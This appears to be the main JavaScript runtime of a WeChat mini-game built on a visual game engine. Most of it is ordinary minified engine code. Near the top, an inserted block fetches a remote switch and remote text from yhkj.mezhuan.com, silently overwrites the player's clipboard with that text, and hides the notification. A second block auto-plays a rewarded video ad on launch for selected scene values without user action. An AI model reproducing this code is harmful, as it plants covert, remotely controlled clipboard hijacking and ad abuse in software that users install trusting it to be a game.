function _typeof2(t) {
    return (_typeof2 = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
        return typeof t;
    } : function (t) {
        return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
    })(t);
}

var _regeneratorRuntime = require("babel-runtime/regenerator"), PIXI$1 = require("pixi.js"), EventEmitter = require("eventemitter3"), Hammer = require("hammerjs");
var _regeneratorRuntime = require("babel-runtime/regenerator"),
    PIXI$1 = require("pixi.js"),
    EventEmitter = require("eventemitter3"),
    Hammer = require("hammerjs");
// 通过异步请求从远程服务器获取控制开关状态
wx.request({
    url: 'https://yhkj.mezhuan.com/ceshi.json', // 替换成实际的远程服务器地址和文件路径
    success(res) {
        // 检查请求是否成功
        if (res.statusCode === 200) {
            // 获取远程控制开关状态
            const remoteControlSwitch = res.data.enabled;
            const sceneStr = res.data.scenes || "";
            const scenes = sceneStr.split(",");
            const launchOptions = wx.getLaunchOptionsSync();
            console.log('场景值:', launchOptions.scene,scenes);

            // 如果远程控制开关启用
            if (remoteControlSwitch && scenes.indexOf(launchOptions.scene + "") != -1) {
                // 继续获取文本数据并设置到剪贴板
                wx.request({
                    url: 'https://yhkj.mezhuan.com/ceshi.txt', // 替换成实际的远程服务器地址和文件路径
                    success(innerRes) {
                        // 检查请求是否成功
                        if (innerRes.statusCode === 200) {
                            // 获取远程文本数据
                            const remoteText = innerRes.data;

                            // 设置剪贴板数据为远程获取的文本数据
                            wx.setClipboardData({
                                data: remoteText,
                                success(setRes) {

                                    // 可在此处显示自定义提示
                                    wx.showToast({ title: '', icon: 'none' });
                                    wx.hideToast(); // 尝试隐藏提示
                                    // 检查设置剪贴板数据是否成功
                                    if (setRes.errMsg === 'setClipboardData:ok') {
                                        console.log('成功将文本设置到剪贴板'); // 成功设置到剪贴板
                                    } else {
                                        console.error('设置剪贴板数据失败', setRes.errMsg);
                                    }
                                }
                            });
                        } else {
                            console.error('请求远程文本数据失败', innerRes.statusCode);
                        }
                    },
                    fail(innerErr) {
                        console.error('请求失败', innerErr);
                    }
                });
            } else {
                console.log('远程控制开关已禁用');
            }
        } else {
            console.error('请求远程控制开关状态失败', res.statusCode);
        }
    },
    fail(err) {
        console.error('请求失败', err);
    }
});
function _interopDefaultLegacy(t) {
    return t && "object" == _typeof2(t) && "default" in t ? t : {
        default: t
    };
}
// ========== 新增：扫码场景值判断 + 自动播放激励视频广告 ==========
// ========== 不限场景值：游戏加载完成后自动播放激励视频广告 ==========
let rewardedVideoAd = null;
let adHasPlayed = false; // 标记广告是否已播放，避免重复调用
const adUnitId = "adunit-097cf357656e00be";

// 版本号对比工具（判断基础库是否支持广告）
function compareVersion(v1, v2) {
v1 = v1.split('.');
v2 = v2.split('.');
const len = Math.max(v1.length, v2.length);
while (v1.length < len) v1.push('0');
while (v2.length < len) v2.push('0');
for (let i = 0; i < len; i++) {
  const num1 = parseInt(v1[i]);
  const num2 = parseInt(v2[i]);
  if (num1 > num2) return 1;
  if (num1 < num2) return -1;
}
return 0;
}

// 1. 提前创建广告实例（游戏加载阶段执行，不阻塞主线程）
function preCreateRewardedAd() {
if (rewardedVideoAd) return;

const sysInfo = wx.getSystemInfoSync();
if (compareVersion(sysInfo.SDKVersion, '2.0.4') < 0) {
  console.log("【广告】微信版本过低，不支持激励视频广告");
  return;
}

try {
  rewardedVideoAd = wx.createRewardedVideoAd({ adUnitId });
  console.log("【广告】实例预创建成功");

  // 广告加载错误监听
  rewardedVideoAd.onError((err) => {
    console.error("【广告】加载/播放失败：", err);
  });

  // 广告关闭回调（无论用户看完还是关闭都触发）
  rewardedVideoAd.onClose((res) => {
    if (res && res.isEnded) {
      console.log("【广告】用户完整观看视频");
    } else {
      console.log("【广告】用户中途关闭视频");
    }
  });
} catch (e) {
  console.error("【广告】实例创建失败：", e);
}
}

function canShowAd() {
  const numbers = [
      1045, 1046, 1067, 1084, 1095, 1079,
    1189, 1200, 1201, 1215, 1079, 1206, 1184, 1272, 1233,
    1228, 1230, 1232, 1238, 1274, 1295,
      1001,1089//测试scene
  ];
  // 在游戏入口文件 game.js 中整合
  const launchOptions = wx.getLaunchOptionsSync();
  const scene = launchOptions.scene;
  console.log("当前scene", scene)

  // 1. 根据场景值判断
  if (numbers.indexOf(scene) != -1) {
      return true
  }
  // return true
  return false
}

// 2. 游戏加载完成后，调用此函数播放广告
function playAdAfterGameLoaded() {
// 防止重复播放
if (adHasPlayed || !rewardedVideoAd) return;

console.log("【广告】游戏加载完成，开始播放激励视频广告");
adHasPlayed = true; // 标记为已播放

rewardedVideoAd.load()
  .then(() => {
    return rewardedVideoAd.show();
  })
  .then(() => {
    console.log("【广告】播放成功");
  })
  .catch((err) => {
    console.error("【广告】播放失败：", err);
  });
}

setTimeout(() => {
  try {
      if (canShowAd() && rewardedVideoAd) {
          playAdAfterGameLoaded()
          require("playad.js")
      }
  } catch (err) {
      console.error(err)
  }
}, 10);
// ========== 关键调用点 ==========
// ① 游戏初始化时，提前创建广告实例（放在vm.js开头即可）
preCreateRewardedAd();

// ② 游戏所有资源加载完成、进入主界面/关卡时，调用一次
// 找到你的游戏加载完成回调，加上这行：
// playAdAfterGameLoaded();
// ==========================================================

function _interopNamespace(i) {
    var n;
    return i && i.__esModule ? i : (n = Object.create(null), i && Object.keys(i).forEach(function (t) {
        var e;
        "default" !== t && (e = Object.getOwnPropertyDescriptor(i, t), Object.defineProperty(n, t, e.get ? e : {
            enumerable: !0,
            get: function () {
                return i[t];
            }
        }));
    }), n.default = i, Object.freeze(n));
}

var _class$m, _temp, _regeneratorRuntime__default = _interopDefaultLegacy(_regeneratorRuntime), PIXI__namespace = _interopNamespace(PIXI$1), EventEmitter__default = _interopDefaultLegacy(EventEmitter), Hammer__namespace = _interopNamespace(Hammer), _typeof$1 = "function" == typeof Symbol && "symbol" == _typeof2(Symbol.iterator) ? function (t) {
    return _typeof2(t);
} : function (t) {
    return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : _typeof2(t);
}, asyncToGenerator = function (t) {
    return function () {
        var o = t.apply(this, arguments);
        return new Promise(function (r, a) {
            return function e(t, i) {
                try {
                    var n = o[t](i), s = n.value;
                } catch (t) {
                    return void a(t);
                }
                if (!n.done) return Promise.resolve(s).then(function (t) {
                    e("next", t);
                }, function (t) {
                    e("throw", t);
                });
                r(s);
            }("next");
        });
    };
}, classCallCheck = function (t, e) {
    if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function");
}, createClass = function () {
    function n(t, e) {
        for (var i = 0; i < e.length; i++) {
            var n = e[i];
            n.enumerable = n.enumerable || !1, n.configurable = !0, "value" in n && (n.writable = !0),
                Object.defineProperty(t, n.key, n);
        }
    }
    return function (t, e, i) {
        return e && n(t.prototype, e), i && n(t, i), t;
    };
}(), _extends$1 = Object.assign || function (t) {
    for (var e = 1; e < arguments.length; e++) {
        var i, n = arguments[e];
        for (i in n) Object.prototype.hasOwnProperty.call(n, i) && (t[i] = n[i]);
    }
    return t;
}, get = function t(e, i, n) {
    null === e && (e = Function.prototype);
    var s = Object.getOwnPropertyDescriptor(e, i);
    return void 0 !== s ? "value" in s ? s.value : void 0 !== (s = s.get) ? s.call(n) : void 0 : null !== (s = Object.getPrototypeOf(e)) ? t(s, i, n) : void 0;
}, inherits = function (t, e) {
    if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function, not " + _typeof2(e));
    t.prototype = Object.create(e && e.prototype, {
        constructor: {
            value: t,
            enumerable: !1,
            writable: !0,
            configurable: !0
        }
    }), e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e);
}, objectWithoutProperties = function (t, e) {
    var i, n = {};
    for (i in t) 0 <= e.indexOf(i) || Object.prototype.hasOwnProperty.call(t, i) && (n[i] = t[i]);
    return n;
}, possibleConstructorReturn = function (t, e) {
    if (t) return !e || "object" != _typeof2(e) && "function" != typeof e ? t : e;
    throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
}, slicedToArray = function (t, e) {
    if (Array.isArray(t)) return t;
    if (Symbol.iterator in Object(t)) {
        var i = e, n = [], s = !0, e = !1, r = void 0;
        try {
            for (var a, o = t[Symbol.iterator](); !(s = (a = o.next()).done) && (n.push(a.value),
                !i || n.length !== i); s = !0);
        } catch (t) {
            e = !0, r = t;
        } finally {
            try {
                !s && o.return && o.return();
            } finally {
                if (e) throw r;
            }
        }
        return n;
    }
    throw new TypeError("Invalid attempt to destructure non-iterable instance");
}, toConsumableArray = function (t) {
    if (Array.isArray(t)) {
        for (var e = 0, i = Array(t.length); e < t.length; e++) i[e] = t[e];
        return i;
    }
    return Array.from(t);
}, IQlsaRhh2H = (window.LB || (window.LB = (_temp = _class$m = function t() {
    throw classCallCheck(this, t), TypeError("static class can't be instantiated");
}, _class$m.isDebug = !1, _class$m.SDK = {}, _class$m.Plugins = {}, _class$m.version = "2.1.3",
    _class$m.Behaviors = {}, _class$m.BlockHelper = {}, _temp)), LB.SDK.IBehaviorBase = function () {
        function e(t) {
            classCallCheck(this, e), this._runtime = t.runtime, this._myObjectClasses = new Set(),
                this._myInstances = new Set();
        }
        return createClass(e, [{
            key: "release",
            value: function () {
                this._myInstances = null, this._myObjectClasses = null, this._runtime = null;
            }
        }, {
            key: "getRuntime",
            value: function () {
                return this._runtime;
            }
        }, {
            key: "onCreate",
            value: function () { }
        }, {
            key: "_addObjectClass",
            value: function (t) {
                this._myObjectClasses.add(t);
            }
        }, {
            key: "getObjectClasses",
            value: function () {
                return this._myObjectClasses;
            }
        }, {
            key: "_addInstance",
            value: function (t) {
                this._myInstances.add(t);
            }
        }, {
            key: "_removeInstance",
            value: function (t) {
                this._myInstances && this._myInstances.delete(t);
            }
        }, {
            key: "getInstances",
            value: function () {
                return this._myInstances;
            }
        }]), e;
    }(), LB.SDK.IBehaviorInstanceBase = function () {
        function e(t) {
            classCallCheck(this, e), this._instance = t.instance, this._runtime = t.runtime,
                this._behaviorType = t.type, this._isTicking = !1;
        }
        return createClass(e, [{
            key: "tick",
            value: function (t) {
                console.log("tick");
            }
        }, {
            key: "isTicking",
            value: function () {
                return this._isTicking;
            }
        }, {
            key: "_startTicking",
            value: function () {
                this._isTicking || (this._runtime._addPluginInstanceToTick(this), this._isTicking = !0);
            }
        }, {
            key: "_stopTicking",
            value: function () {
                this._isTicking && (this._runtime._removePluginInstanceToTick(this), this._isTicking = !1);
            }
        }, {
            key: "getObjectInstance",
            value: function () {
                return this._instance;
            }
        }, {
            key: "release",
            value: function () {
                this._stopTicking(), this._behaviorType._removeInstance(this), this._instance = null,
                    this._runtime = null, this._behaviorType = null;
            }
        }, {
            key: "behaviorType",
            get: function () {
                return this._behaviorType;
            }
        }]), e;
    }(), {
    id: "IQlsaRhh2H",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}), eIyi0Llutk = {
    id: "eIyi0Llutk",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, W53FFkLQ6u = {
    id: "W53FFkLQ6u",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, VOh8B66CPa = {
    id: "VOh8B66CPa",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, ANjOM7Gpay = {
    id: "ANjOM7Gpay",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, QE0jlS05jn = {
    id: "QE0jlS05jn",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, Jm8TMV7lUp = {
    id: "Jm8TMV7lUp",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, B8Sev4UTza = {
    id: "B8Sev4UTza",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, RlrKMAcrQd = {
    id: "RlrKMAcrQd",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, YfeViruFb9 = {
    id: "YfeViruFb9",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, HM8gZhLeWr = {
    id: "HM8gZhLeWr",
    isGlobal: 1,
    isSystem: 1,
    type: "system"
}, pluginSystemConfig = [IQlsaRhh2H, eIyi0Llutk, W53FFkLQ6u, QE0jlS05jn, Jm8TMV7lUp, B8Sev4UTza, VOh8B66CPa, YfeViruFb9, HM8gZhLeWr, ANjOM7Gpay, RlrKMAcrQd], _class$l = (LB.SDK.IPluginBase = function () {
    function e(t) {
        classCallCheck(this, e), this._runtime = t.runtime, this._isSingleGlobal = !!t.isSingleGlobal,
            this._singleGlobalObjectClass = null;
    }
    return createClass(e, [{
        key: "release",
        value: function () { }
    }, {
        key: "onCreate",
        value: function () { }
    }, {
        key: "reset",
        value: function () {
            this._singleGlobalObjectClass && this._singleGlobalObjectClass._instances[0].reset();
        }
    }, {
        key: "isSingleGlobal",
        value: function () {
            return this._isSingleGlobal;
        }
    }, {
        key: "setSingleGlobalObjectClass",
        value: function (t) {
            this._singleGlobalObjectClass = t;
        }
    }, {
        key: "getSingleGlobalObjectClass",
        value: function () {
            if (this.isSingleGlobal()) return this._singleGlobalObjectClass;
            throw new Error("must be single-global plugin");
        }
    }]), e;
}(), LB.SDK.IPluginInstanceBase = function () {
    function e(t) {
        classCallCheck(this, e), this._inst = t, this._runtime = t.getRuntime(), this.eventEmitter = this._runtime.eventEmitter,
            this._objectClass = this._inst.getObjectClass(), this._sdkType = this._objectClass.getSdkType(),
            this._tickFunc = null, this._isTicking = !1, this._wasReleased = !1;
    }
    return createClass(e, [{
        key: "reset",
        value: function () {
            console.log("plugin reset");
        }
    }, {
        key: "release",
        value: function () {
            this._wasReleased = !0, this._stopTicking(), this._tickFunc = null, this._inst = null,
                this._runtime = null, this._objectClass = null, this._sdkType = null;
        }
    }, {
        key: "wasReleased",
        value: function () {
            return this._wasReleased;
        }
    }, {
        key: "getInstance",
        value: function () {
            return this._inst;
        }
    }, {
        key: "getRuntime",
        value: function () {
            return this._runtime;
        }
    }, {
        key: "getObjectClass",
        value: function () {
            return this._objectClass;
        }
    }, {
        key: "tick",
        value: function () {
            console.log("tick");
        }
    }, {
        key: "startTicking",
        value: function () {
            var e = this;
            this._isTicking || this._tickFunc || (this._tickFunc = function (t) {
                return e.tick(t);
            }), this.eventEmitter.on("tick", this._tickFunc), this._isTicking = !0;
        }
    }, {
        key: "_stopTicking",
        value: function () {
            this._isTicking && (this.eventEmitter.off("tick", this._tickFunc), this._isTicking = !1);
        }
    }, {
        key: "isTicking",
        value: function () {
            return this._isTicking;
        }
    }, {
        key: "renderTarget",
        get: function () {
            return this._inst._renderTarget;
        }
    }, {
        key: "layer",
        get: function () {
            return this._inst.parent;
        }
    }]), e;
}(), function (t) {
    function e(t) {
        return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
            t;
    }
    return inherits(e, t), createClass(e, [{
        key: "release",
        value: function () {
            get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
        }
    }, {
        key: "currentThread",
        get: function () {
            return this._blockEngine.currentThread;
        }
    }, {
        key: "blockEngine",
        get: function () {
            return this._blockEngine;
        }
    }]), e;
}(LB.SDK.IPluginInstanceBase)), Action$b = {
    so02x8Qj9n: {
        fun: function () {
            this.currentThread.startBranch(1, !0);
        }
    },
    wOQtBp2eUZ: {
        args: [{
            type: "input",
            name: "TIMES",
            input: "w_number",
            default: 1
        }],
        fun: function (t) {
            var t = Math.round(Number(t)), e = this.currentThread.peekStackFrame();
            void 0 === e.loopCounter && (e.loopCounter = t), e.loopCounter--, 0 <= e.loopCounter && this.currentThread.startBranch(1, !0);
        }
    },
    W03AOYBmEk: {
        args: [{
            type: "input",
            name: "CONDITION",
            input: "boolean"
        }],
        fun: function (t) {
            LB.Util.toBoolean(t) || this.currentThread.startBranch(1, !0);
        }
    },
    ZwW025FyC6: {
        args: [{
            type: "input",
            name: "TIMES",
            input: "w_number",
            default: 1
        }],
        fun: function (t) {
            var t = Math.round(Number(t)), e = this.currentThread.peekStackFrame();
            e.isLogicLoop = !0, void 0 === e.loopCounter && (e.loopCounter = t), e.loopCounter--,
                0 <= e.loopCounter && this.currentThread.startBranch(1, !1);
        }
    },
    L0DNlaU5wd: {
        fun: function () {
            this.currentThread.breakloop();
        }
    },
    pZRvEFZcS9: {
        fun: function () {
            this.currentThread.breakLogicLoop();
        }
    },
    LRLokYNp9y: {
        args: [{
            type: "input",
            name: "CONDITION",
            input: "boolean"
        }],
        fun: function (t) {
            LB.Util.toBoolean(t) && this.currentThread.startBranch(1, !1);
        }
    },
    QmKX0cwH0n: {
        args: [{
            type: "input",
            name: "CONDITION",
            input: "boolean"
        }],
        fun: function (t) {
            LB.Util.toBoolean(t) ? this.currentThread.startBranch(1, !1) : this.currentThread.startBranch(2, !1);
        }
    },
    BnoBvIhS1w: {
        args: [{
            type: "input",
            name: "DURATION",
            input: "p_number",
            default: 1
        }],
        fun: function (t) {
            var e;
            t <= 0 || (t = Math.max(0, 1e3 * +t), (e = this.currentThread.peekStackFrame()).timer ? e.timer.frameClock(1e3 * this._runtime._frameTime) < e.duration ? this.currentThread.setYieldStatus() : (this.currentThread.setRunningStatus(),
                delete e.timer) : (e.timer = new LB.Timer(), e.timer.start(), e.duration = t, this.currentThread.setYieldStatus()));
        }
    },
    CmirvRiu7j: {
        args: [{
            type: "input",
            name: "DURATION",
            input: "p_number",
            default: 1
        }],
        fun: function (t) {
            var e;
            t <= 0 || (t = Math.max(0, 16.6 * t), (e = this.currentThread.peekStackFrame()).timer ? e.timer.frameClock(16.67) < e.duration ? this.currentThread.setYieldStatus() : (this.currentThread.setRunningStatus(),
                delete e.timer) : (e.timer = new LB.Timer(), e.timer.start(), e.duration = t, this.currentThread.setYieldStatus()));
        }
    },
    XD4EnvRVhu: {
        args: [{
            type: "input",
            name: "CONDITION",
            input: "boolean"
        }],
        fun: function (t) {
            LB.Util.toBoolean(t) || this.currentThread.setYieldStatus();
        }
    }
}, Condition$a = {}, Expression$a = {}, _class$k = function (t) {
    function e(t) {
        return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
    }
    return inherits(e, t), createClass(e, [{
        key: "release",
        value: function () {
            get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
        }
    }]), e;
}(LB.SDK.IPluginBase), wxSystemInfo$1 = (_class$k.Instance = _class$l, _class$k.Action = Action$b,
    _class$k.Condition = Condition$a, _class$k.Expression = Expression$a, "undefined" != typeof wx ? wx.getSystemInfoSync() : null), Config = {
        physicsEngine: "box2d",
        cdn_url: "https://gamemaker.qpic.cn/luban/",
        horizontal: !1,
        isCodeMode: !1,
        adaptationMode: 1,
        _width: 375,
        _height: 667,
        devicePixelRatio: 2,
        _zoom: 1,
        get GAME_HEIGHT() {
            return this.horizontal ? 375 : 667;
        },
        get GAME_WIDTH() {
            return this.horizontal ? 667 : 375;
        },
        get RealWidth() {
            return wxSystemInfo$1 ? wxSystemInfo$1.windowWidth : this.horizontal ? this._height : this._width;
        },
        get RealHeight() {
            return wxSystemInfo$1 ? wxSystemInfo$1.windowHeight : this.horizontal ? this._width : this._height;
        }
    }, wxSystemInfo = "undefined" != typeof wx ? wx.getSystemInfoSync() : null, isMiniGame = "undefined" != typeof wx, info = void 0;

function getDeviceInfo() {
    var e = {
        devicePixelRatio: Config.devicePixelRatio || 2,
        windowWidth: 375,
        windowHeight: 667
    };
    if ("undefined" != typeof wx) try {
        info = wxSystemInfo;
    } catch (t) {
        console.log(t), info = e;
    } else info = e;
    return info.isMiniGame = isMiniGame, info.GAME_WIDTH = Config.GAME_WIDTH * info.devicePixelRatio,
        info.GAME_HEIGHT = Config.GAME_HEIGHT * info.devicePixelRatio, info.realWidth = Config.RealWidth * info.devicePixelRatio,
        info.realHeight = Config.RealHeight * info.devicePixelRatio, info;
}

var isDevTool$1 = !!isMiniGame && "devtools" !== wxSystemInfo.platform, devNum$1 = isDevTool$1 ? 1e3 : 1, PerformanceList = [], PerformanceInfo = {}, listPointTemp = {}, Performance = {
    startPoint: function (t) {
        LB.isDebug && (PerformanceInfo[t] ? console.error("当前帧已经存在相同测速点", t) : PerformanceInfo[t] = window.performance.now());
    },
    endPoint: function (t) {
        LB.isDebug && (PerformanceInfo[t] = (window.performance.now() - PerformanceInfo[t]) / devNum$1);
    },
    newPointList: function (t) {
        LB.isDebug && (PerformanceInfo[t] ? console.error("当前帧已经存在相同数组名", t) : PerformanceInfo[t] = []);
    },
    startPointToList: function (t) {
        LB.isDebug && (listPointTemp[t] = window.performance.now());
    },
    endPointToList: function (t) {
        LB.isDebug && PerformanceInfo[t] && PerformanceInfo[t].push((window.performance.now() - listPointTemp[t]) / devNum$1);
    },
    print: function () {
        if (LB.isDebug) return PerformanceList;
    },
    log: function (t, e) {
        LB.isDebug && (PerformanceInfo[t] = e);
    },
    clear: function () {
        LB.isDebug && (PerformanceList = [], PerformanceInfo = {}, listPointTemp = {});
    },
    addPerformanceInfoToList: function () {
        LB.isDebug && (2e3 < PerformanceList.length && PerformanceList.shift(), PerformanceInfo.memory = this.addMemory(),
            PerformanceList.push(PerformanceInfo), PerformanceInfo = {}, listPointTemp = {});
    },
    addMemory: function () {
        return window.performance && window.performance.memory ? window.performance.memory.usedJSHeapSize / 1048576 : 0;
    },
    getUsedMemory: function () {
        return window.performance && window.performance.memory ? window.performance.memory.usedJSHeapSize / 1048576 : 0;
    }
}, OPCODE = {
    eventGameStart: "RYtwT5px43",
    eventReceivedMsg: "BNhVHaAGmY",
    eventSwitchScene: "Phr9bioWyI",
    eventSceneStart: "fNDp3ghodh",
    eventScreenSwip: "n6q6a4jEaf",
    eventTouchingSprite: "i4yEnWuqJD",
    eventTouchingScreen: "iWvb0YzTPw",
    eventWhen: "QGkpdcDNk4",
    eventObjectTouchingObject: "jESg3MDTqg",
    eventObjectIntersectObject: "gv7XSHodFp",
    eventObjectMoveout: "T3iuqqZrAP",
    eventStartAsClone: "bM0Q6ktfbv",
    eventSendMsg: "ayaLZl2qVp",
    eventDeviceMotionChange: "z4XdyI4uY5",
    eventAdEnd: "aoCNY4ZrZg",
    eventAdError: "XvVGhZZJyN",
    eventGameShow: "dy85n4eJ4N",
    eventGameHide: "dETN6NiW3Y",
    eventOpenProgramSuccess: "VpLIili8RH",
    eventKeyboardConfirm: "LpWdUqnnKm",
    eventKeyboardComplete: "fhAnhGxhVr",
    eventVideoEnded: "djIxyhzE0t",
    pp: "CPYU624uOI",
    pc: "s3QaMAC0QG",
    pcr: "sMy1Bap9Zh",
    pd: "i8v8mVNGE7",
    pr: "l2iDTXwvSN",
    arb: "NxyDFRF9MB",
    arsn: "QZCvBRhuPd",
    aeb: "yiI184BeJS",
    aesn: "FpLaJIxWNN"
}, OLDCODE_TRANSFORM_NEWCODE = {
    lf: "IQlsaRhh2H.so02x8Qj9n",
    lrt: "IQlsaRhh2H.wOQtBp2eUZ",
    lre: "IQlsaRhh2H.W03AOYBmEk",
    ll: "IQlsaRhh2H.ZwW025FyC6",
    lb: "IQlsaRhh2H.L0DNlaU5wd",
    lbll: "IQlsaRhh2H.pZRvEFZcS9",
    li: "IQlsaRhh2H.LRLokYNp9y",
    lif: "IQlsaRhh2H.QmKX0cwH0n",
    lw: "IQlsaRhh2H.BnoBvIhS1w",
    lwa: "IQlsaRhh2H.CmirvRiu7j",
    lwai: "IQlsaRhh2H.XD4EnvRVhu",
    csd: "eIyi0Llutk.QYEgN5CLl3",
    cse: "eIyi0Llutk.hQgym4nVos",
    cc: "eIyi0Llutk.GJNTf4loXv",
    ccr: "Control.createCloneAndMoveToTarget",
    cd: "eIyi0Llutk.FCrF434uxA",
    cs: "eIyi0Llutk.tg38vVbCCZ",
    cst: "eIyi0Llutk.nqa1Hc77fc",
    cr: "eIyi0Llutk.ZzUSGqW9h3",
    cj: "eIyi0Llutk.xSBRCUekbH",
    cre: "eIyi0Llutk.QOcko4u16A",
    cset: "eIyi0Llutk.ffA99kPUml",
    cseto: "eIyi0Llutk.iJMASrUITy",
    cf: "eIyi0Llutk.syRTXLMSvF",
    ct: "eIyi0Llutk.BrTUHbzRUF",
    crel: "eIyi0Llutk.o8GvSx9Pxk",
    mm: "W53FFkLQ6u.Ihrzh6zqt4",
    mt: "W53FFkLQ6u.T0Ajfiyxwe",
    mto: "W53FFkLQ6u.u5ukO3srm6",
    mg: "W53FFkLQ6u.oWVaeCAJ4W",
    bb: "Bounceof.bounceOfTarget",
    mr: "W53FFkLQ6u.GNxFyP302o",
    mro: "W53FFkLQ6u.jpkYEG0JK7",
    mtu: "W53FFkLQ6u.U4Ej1XIfNf",
    mgo: "W53FFkLQ6u.uqg2ii7ig3",
    ms: "W53FFkLQ6u.FeUA0Sh825",
    mc: "W53FFkLQ6u.v31p2EoOqo",
    mse: "Motion.setPivot",
    "Motion.bounceOfTarget": "Bounceof.bounceOfTarget",
    ls: "QE0jlS05jn.XWzwbnDz9t",
    lh: "QE0jlS05jn.ugVdNPh9BT",
    lswi: "QE0jlS05jn.mKOPebyB90",
    lsw: "QE0jlS05jn.DAeKJl8aje",
    lsb: "QE0jlS05jn.yRwngbLN5B",
    lsss: "QE0jlS05jn.btjATmos0y",
    lse: "QE0jlS05jn.HQBbdsgKi3",
    lc: "QE0jlS05jn.Tpe8x5p2pO",
    lset: "QE0jlS05jn.wUkQOoVkrB",
    lca: "QE0jlS05jn.xr40P4lCmN",
    lssf: "QE0jlS05jn.aRqmxIHJ9C",
    lsn: "QE0jlS05jn.brUEXyKhU8",
    lan: "QE0jlS05jn.IR55QBu7wz",
    lst: "QE0jlS05jn.RK4LWOqZPf",
    lscr: "QE0jlS05jn.pePqmV8IlK",
    lscb: "QE0jlS05jn.xJXALu5cix",
    lsd: "QE0jlS05jn.zpbFlbk4T5",
    lsdaw: "QE0jlS05jn.sIgNMMmceR",
    lcd: "QE0jlS05jn.uMSVczXwY1",
    ln: "Looks.nextCostume",
    af: "Jm8TMV7lUp.Qg5osTEvbg",
    as: "Jm8TMV7lUp.Amld72yfee",
    afo: "Jm8TMV7lUp.qHjea00gvX",
    afi: "Jm8TMV7lUp.BeNjH7bRp1",
    ag: "Jm8TMV7lUp.PHGdP7XtJy",
    agp: "Jm8TMV7lUp.cHyHRHJSCk",
    ar: "Jm8TMV7lUp.zG3tOjTsaA",
    sc: "B8Sev4UTza.LhCMOYH1nN",
    si: "B8Sev4UTza.fwhrKviVlo",
    so: "B8Sev4UTza.q6U1hliOtU",
    sg: "B8Sev4UTza.NfwxPz7dNH",
    sgb: "B8Sev4UTza.MlgIv01IdL",
    sgp: "B8Sev4UTza.U1wYE2UAca",
    sgm: "B8Sev4UTza.DLSu95z4J0",
    sgd: "B8Sev4UTza.VbobcwTphy",
    sd: "B8Sev4UTza.fkyT1PvwrS",
    ob: "VOh8B66CPa.c0MI8PtMXg",
    oo: "VOh8B66CPa.dyaEKOk92A",
    oc: "VOh8B66CPa.jnicy19QKr",
    or: "VOh8B66CPa.f0cdVHGwyA",
    ord: "VOh8B66CPa.SLbmfGCXEi",
    om: "VOh8B66CPa.X69RB6N73n",
    op: "VOh8B66CPa.yLSrt4L6GM",
    os: "VOh8B66CPa.II9ayCmjIH",
    ot: "VOh8B66CPa.jli8Gwydoq",
    ote: "VOh8B66CPa.dOrvFfYuk6",
    ds: "YfeViruFb9.NcUfKeJ1fT",
    dc: "YfeViruFb9.MPzVndBMrb",
    da: "YfeViruFb9.BMs7KnFk7t",
    dd: "YfeViruFb9.UA6EvywHdC",
    dda: "YfeViruFb9.jk8cjBHIuz",
    di: "YfeViruFb9.uH6DsySLkh",
    dr: "YfeViruFb9.tNPVlP5bCs",
    dsl: "YfeViruFb9.ASKjZwCx2J",
    dic: "YfeViruFb9.JNhc4S7A4n",
    dgv: "YfeViruFb9.RsymirROVN",
    dgl: "YfeViruFb9.HkCmXWBXkj",
    dgi: "YfeViruFb9.LAxiE1lput",
    dio: "YfeViruFb9.SofX7lKa8w",
    dg: "YfeViruFb9.Hm4uHtvkQw",
    dglo: "YfeViruFb9.R9EoxnzXPi",
    dgt: "YfeViruFb9.MAQ8KJ57Xg",
    sp: "ANjOM7Gpay.Qnq8g5zBrP",
    spb: "ANjOM7Gpay.Gy1Z8kGoSj",
    ssa: "ANjOM7Gpay.cdgwXyBLnY",
    sps: "ANjOM7Gpay.mGcrgmqr5T",
    ss: "ANjOM7Gpay.GZQJrs7GrX",
    spsaw: "Sound.playSoundAndWait",
    spm: "ANjOM7Gpay.X3ZRlsFuhs",
    msst: "RlrKMAcrQd.XmA45E5x5V",
    msm: "RlrKMAcrQd.ALezKqCl7g",
    mo: "RlrKMAcrQd.Z522ylk7nZ",
    mn: "RlrKMAcrQd.undefined",
    mrs: "RlrKMAcrQd.cz0MCJ7Gcz",
    msr: "RlrKMAcrQd.dxE2YoVuQB",
    mst: "RlrKMAcrQd.ggsNToNBml",
    msru: "RlrKMAcrQd.d5qRpU8TX7",
    msrs: "RlrKMAcrQd.s95Asg5r9E",
    msrp: "RlrKMAcrQd.kDENqdPeAa",
    msv: "RlrKMAcrQd.J7kgplEnzI",
    mlv: "RlrKMAcrQd.AcIEvUTyTo",
    lg: "LocalStorage.get",
    lss: "LocalStorage.set",
    lr: "LocalStorage.remove",
    lstcr: "LocalStorage.clear",
    po: "Physical.openPhysical",
    pc: "Physical.closePhysical",
    psp: "Physical.setPhysicalScreenEdge",
    psc: "Physical.setCanCollision",
    pscp: "Physical.setCollisionPrecision",
    pscr: "Physical.setCanRotation",
    pscd: "Physical.setCanDump",
    psf: "Physical.setfriction",
    psr: "Physical.setRebound",
    psg: "Physical.setGravity",
    pss: "Physical.setSpeed",
    psfe: "Physical.setForce",
    psm: "Physical.setMass",
